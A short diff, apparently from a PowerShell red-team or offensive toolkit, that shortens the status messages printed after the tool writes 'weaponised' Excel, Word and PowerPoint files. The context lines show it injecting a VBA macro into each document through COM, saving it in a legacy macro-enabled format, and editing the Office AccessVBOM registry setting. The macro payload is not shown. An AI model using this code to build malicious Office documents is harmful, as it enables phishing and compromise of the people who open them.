@@ -451,7 +451,7 @@ UpdateMacro'
     $ExcelVBA = $ExcelWorkbook.VBProject.VBComponents.Add(1)
     $ExcelVBA.CodeModule.AddFromString($macrodoc)
     $ExcelWorkbook.SaveAs("$global:newdir\payloads\ExcelMacro", [Microsoft.Office.Interop.Excel.XLFileFormat]::xlExcel8)
-    Write-Host -Object "Weaponised Microsoft Excel Document written to: $global:newdir\payloads\ExcelMacro.xls"  -ForegroundColor Green
+    Write-Host -Object "Weaponised Excel Doc: $global:newdir\payloads\ExcelMacro.xls"  -ForegroundColor Green
     $ExcelApp.Workbooks.Close()
     $ExcelApp.Quit()
 
@@ -470,7 +470,7 @@ UpdateMacro'
     $WordVBA = $WordPage.VBProject.VBComponents.Add(1)
     $WordVBA.CodeModule.AddFromString($macrodoc)
     $WordPage.SaveAs([ref]"$global:newdir\payloads\WordMacro", [ref][Microsoft.Office.Interop.Word.WdSaveFormat]::wdFormatDocument97)
-    Write-Host -Object "Weaponised Microsoft Word Document written to: $global:newdir\payloads\WordMacro.doc"  -ForegroundColor Green
+    Write-Host -Object "Weaponised Word Doc: $global:newdir\payloads\WordMacro.doc"  -ForegroundColor Green
     $WordApp.Quit()
 
     Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$WordVersion\Word\Security" -Name AccessVBOM | Out-Null
@@ -491,7 +491,7 @@ UpdateMacro'
     $PPTVBA = $PPTPage.VBProject.VBComponents.Add(1)
     $PPTVBA.CodeModule.AddFromString($macrodoc)
     $PPTPage.SaveAs("$global:newdir\payloads\PowerpointMacro", [Microsoft.Office.Interop.Powerpoint.PpSaveAsFileType]::ppSaveAsPresentation)
-    Write-Host -Object "Weaponised Microsoft Powerpoint Document written to: $global:newdir\payloads\PowerpointMacro.ppt"  -ForegroundColor Green
+    Write-Host -Object "Weaponised Powerpoint Doc: $global:newdir\payloads\PowerpointMacro.ppt"  -ForegroundColor Green
     $PPTPage.Close()
     $PPTApp.Quit()
     Stop-Process -name "POWERPNT"
